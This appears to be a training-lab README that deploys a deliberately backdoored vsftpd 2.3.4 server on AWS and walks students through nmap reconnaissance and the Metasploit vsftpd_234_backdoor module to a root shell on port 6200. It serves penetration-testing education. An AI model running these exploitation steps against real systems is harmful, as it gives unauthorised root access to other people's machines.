# Cybetary Academy - Lab 1: Recon & vsftpd 2.3.4 Exploitation

## 🎯 Lab Overview
This lab contains a vulnerable machine for Cybetary Academy students:
- **Port 80 (HTTP)**: Cybetary Academy Gateway landing page (web reconnaissance).
- **Port 21 (FTP)**: Vulnerable **vsftpd 2.3.4** service containing the backdoor (Smile face `:)` payload spawning a root shell on port 6200).

---

## ☁️ AWS EC2 / Cloud VM Deployment

### 1. Launch an EC2 Instance (Vulnerable Target)
- **AMI**: Ubuntu 22.04 LTS (or Debian 11/12)
- **Instance Type**: `t2.micro` or `t3.micro` (free tier eligible)
- **VPC / Subnet**: Place it in your lab's VPC subnet alongside your Kali Linux / Attacker instance.
- **Security Group (Important)**:
  Allow the following inbound rules from your **Kali machine's Private IP** (or subnet):
  - **TCP 22**: SSH (for management)
  - **TCP 80**: HTTP
  - **TCP 21**: FTP (vsftpd)
  - **TCP 6200**: vsftpd backdoor shell trigger port

### 2. Auto-deploy via AWS EC2 User Data (Zero Touch)
When launching your EC2 instance, expand **Advanced details** at the bottom, paste the contents of `user_data.sh` (or `setup.sh`) into **User data**, and launch.
The instance will automatically clone, install, and start all services upon boot.

### 3. Manual Deploy via SSH
Alternatively, SSH into your EC2 Ubuntu instance and run:
```bash
git clone <your-github-repo-url> vulnvm1
cd vulnvm1
chmod +x setup.sh
sudo ./setup.sh
```

---

## 🕵️ Pentesting Walkthrough (From Kali Linux on the Same VPC/LAN)

### Step 1: Reconnaissance (Nmap)
Replace `<TARGET_PRIVATE_IP>` with the EC2 target's private IP (e.g. `10.0.1.50` or `172.31.x.x`):

```bash
nmap -sV -sC -p 21,80 <TARGET_PRIVATE_IP>
```

**Expected Result:**
- Port 80: Open (`Apache httpd`)
- Port 21: Open (`vsftpd 2.3.4`)

---

### Step 2: Web Inspection
Navigate to `http://<TARGET_PRIVATE_IP>` in your browser or with curl:
```bash
curl http://<TARGET_PRIVATE_IP>
```
Displays the **Cybetary Academy Gateway** internal landing page.

---

### Step 3: Exploitation with Metasploit (`msfconsole`)
1. Launch Metasploit on your attacker instance:
   ```bash
   msfconsole -q
   ```
2. Select the exploit module:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   ```
3. Set the target private IP:
   ```bash
   set RHOSTS <TARGET_PRIVATE_IP>
   ```
4. Exploit:
   ```bash
   exploit
   ```

**Expected Result:**
```text
[*] <TARGET_PRIVATE_IP>:21 - Banner: 220 (vsFTPd 2.3.4)
[+] <TARGET_PRIVATE_IP>:21 - Backdoor service has been spawned, handling...
[+] <TARGET_PRIVATE_IP>:21 - UID: 0: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (<ATTACKER_IP>:xxxx -> <TARGET_PRIVATE_IP>:6200)

id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

🎉 **Root shell obtained via the private IP!**
